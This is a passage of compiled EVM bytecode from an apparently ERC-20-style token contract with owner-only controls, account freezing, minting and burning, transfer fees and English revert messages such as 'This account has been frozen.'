ffffffffffffffffffffffff1681526020019081526020016000208190555061172681600960008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461238b90919063ffffffff16565b600960008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055503373ffffffffffffffffffffffffffffffffffffffff166108fc6117b96005548561322790919063ffffffff16565b9081150290604051600060405180830381858888f193505050501580156117e4573d6000803e3d6000fd5b507f43c820d62513e45a4f2756546d688ea9d0bc8c4a413406b195921581f43d7012338383604051808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001838152602001828152602001935050505060405180910390a15050565b6000600860009054906101000a900460ff16905090565b600061190e833361190985600a60008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461238b90919063ffffffff16565b6123ce565b6001905092915050565b6000600960008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b611969611ef2565b15156119dd576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600e8152602001807f594f5552204e4f54204f574e455200000000000000000000000000000000000081525060200191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a360008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b6000611aa9833384613265565b6001905092915050565b6000600654905090565b6000600860009054906101000a900460ff16151515611adb57600080fd5b611ae3611ef2565b1515611b57576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600e8152602001807f594f5552204e4f54204f574e455200000000000000000000000000000000000081525060200191505060405180910390fd5b611b613383613551565b60019050919050565b611b72611ef2565b1515611be6576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600e8152602001807f594f5552204e4f54204f574e455200000000000000000000000000000000000081525060200191505060405180910390fd5b6000600b60008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055507f48335238b4855f35377ed80f164e8c6f3c366e54ac00b96a6402d4a9814a03a5816000604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001821515151581526020019250505060405180910390a150565b6000611cbd8383613710565b6001905092915050565b611ccf611ef2565b1515611d43576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600e8152602001807f594f5552204e4f54204f574e455200000000000000000000000000000000000081525060200191505060405180910390fd5b600860009054906101000a900460ff16151515611d5f57600080fd5b6001600860006101000a81548160ff0219169083151502179055507f62e78cea01bee320cd4e420270b5ea74000d11b0c9f74754ebdbfc544b05a25833604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390a1565b6000600860009054906101000a900460ff16151515611dfd57600080fd5b81600960003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410151515611eb4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260138152602001807f62652073686f7274206f662062616c616e63650000000000000000000000000081525060200191505060405180910390fd5b611ebf338484612766565b6001905092915050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614905090565b6000611fe43384611fdf85600a60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546123ac90919063ffffffff16565b6123ce565b6001905092915050565b600b6020528060005260406000206000915054906101000a900460ff1681565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000600860009054906101000a900460ff1615151561204b57600080fd5b61205533836137b7565b60019050919050565b6000600a60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b6000600754905090565b600061218a833361218585600a60008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546123ac90919063ffffffff16565b6123ce565b6001905092915050565b61219c611ef2565b1515612210576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600e8152602001807f594f5552204e4f54204f574e455200000000000000000000000000000000000081525060200191505060405180910390fd5b8060078190555050565b612222611ef2565b1515612296576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600e8152602001807f594f5552204e4f54204f574e455200000000000000000000000000000000000081525060200191505060405180910390fd5b6001600b60008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055507f48335238b4855f35377ed80f164e8c6f3c366e54ac00b96a6402d4a9814a03a5816001604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001821515151581526020019250505060405180910390a150565b6000808211151561237157600080fd5b6000828481151561237e57fe5b0490508091505092915050565b60008082840190508381101515156123a257600080fd5b8091505092915050565b60008282111515156123bd57600080fd5b600082840390508091505092915050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614151515612473576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f6265206e6f742061206e6f726d616c20617070726f616368000000000000000081525060200191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614151515612518576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f6265206e6f742061206e6f726d616c20617070726f616368000000000000000081525060200191505060405180910390fd5b80600a60008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16141515156126a8576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f49742773206e6f742061206e6f726d616c20617070726f6163682e000000000081525060200191505060405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415151561280b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f6265206e6f742061206e6f726d616c20617070726f616368000000000000000081525060200191505060405180910390fd5b8273ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141515156128af576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f596f752063616e27742073656e6420697420616c6f6e652e000000000000000081525060200191505060405180910390fd5b600960008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020548111151515612966576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260138152602001807f62652073686f7274206f662062616c616e63650000000000000000000000000081525060200191505060405180910390fd5b600b60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151515612a4e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260268152602001807f54686973206163636f756e7420686173206265656e2066726f7a656e2e205b5381526020017f656e6465725d000000000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b600b60008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151515612b36576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260298152602001807f54686973206163636f756e7420686173206265656e2066726f7a656e2e205b5281526020017f6563697069656e745d000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b600b60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151515612c1e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260268152602001807f54686973206163636f756e7420686173206265656e2066726f7a656e2e205b5781526020017f616c6c65745d000000000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b612c34600260075461322790919063ffffffff16565b3073ffffffffffffffffffffffffffffffffffffffff1631111515612d0d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252604a8152602001807f5472616e73616374696f6e2063616e6e6f7420626520706572666f726d65642081526020017f617420746869732074696d652e2054727920616761696e206e6578742074696d81526020017f652e28636f64652d30310000000000000000000000000000000000000000000081525060600191505060405180910390fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415612e9157612db481600960008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546123ac90919063ffffffff16565b600960008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550612e4981600960008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461238b90919063ffffffff16565b600960008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506131bd565b612ea66007548261238b90919063ffffffff16565b600960008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410151515612f5c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260138152602001807f62652073686f7274206f662062616c616e63650000000000000000000000000081525060200191505060405180910390fd5b612fc2612f746007548361238b90919063ffffffff16565b600960008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546123ac90919063ffffffff16565b600960008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061305781600960008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461238b90919063ffffffff16565b600960008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061310f600754600960008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461238b90919063ffffffff16565b600960008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff166108fc6007549081150290604051600060405180830381858888f193505050501580156131bb573d6000803e3d6000fd5b505b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b60008083141561323a576000905061325f565b6000828402905082848281151561324d57fe5b0414151561325a57600080fd5b809150505b92915050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415151561330a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f6265206e6f742061206e6f726d616c20617070726f616368000000000000000081525060200191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141515156133af576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f6265206e6f742061206e6f726d616c20617070726f616368000000000000000081525060200191505060405180910390fd5b80600960008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410151515613466576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260138152602001807f62652073686f7274206f662062616c616e63650000000000000000000000000081525060200191505060405180910390fd5b80600a60008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141515156135f6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f6265206e6f742061206e6f726d616c20617070726f616368000000000000000081525060200191505060405180910390fd5b61360b8160045461238b90919063ffffffff16565b60048190555061366381600960008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461238b90919063ffffffff16565b600960008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b61371a82826137b7565b6137b382336137ae84600a60008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546123ac90919063ffffffff16565b6123ce565b5050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415151561385c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f6265206e6f742061206e6f726d616c20617070726f616368000000000000000081525060200191505060405180910390fd5b600960008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020548111151515613913576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260138152602001807f62652073686f7274206f662062616c616e63650000000000000000000000000081525060200191505060405180910390fd5b613928816004546123ac90919063ffffffff16565b60048190555061398081600960008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546123ac90919063ffffffff16565b600960008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505056fea165627a7a72305820d67a00b979273e2d16d920b291b8ffa9a97fee89aa51496d96348a8153415ddb0029"
}